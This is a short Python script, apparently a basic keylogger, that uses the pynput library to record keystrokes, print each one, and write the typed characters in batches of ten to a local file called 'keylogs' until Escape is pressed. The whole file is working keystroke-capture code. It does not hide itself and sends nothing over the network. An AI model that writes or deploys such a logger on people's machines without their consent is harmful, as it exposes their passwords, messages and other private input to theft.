import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def file_writer(keys):
    with open("keylogs","a") as logfile:
        for key in keys:
            k = str(key).replace("\'","")
            if k == "Key.space":
                logfile.write('\n')
            elif k.find("Key") == -1:
                logfile.write(k)

def pressed(key):
    global keys, count
    keys.append(key)
    count += 1
    print(key, "pressed")

    if count>= 10:
        count = 0
        file_writer(keys)
        keys = []

def released(key):
    if key==Key.esc:
        return False

with Listener(on_press=pressed, on_release=released) as the_listener:
    the_listener.join()
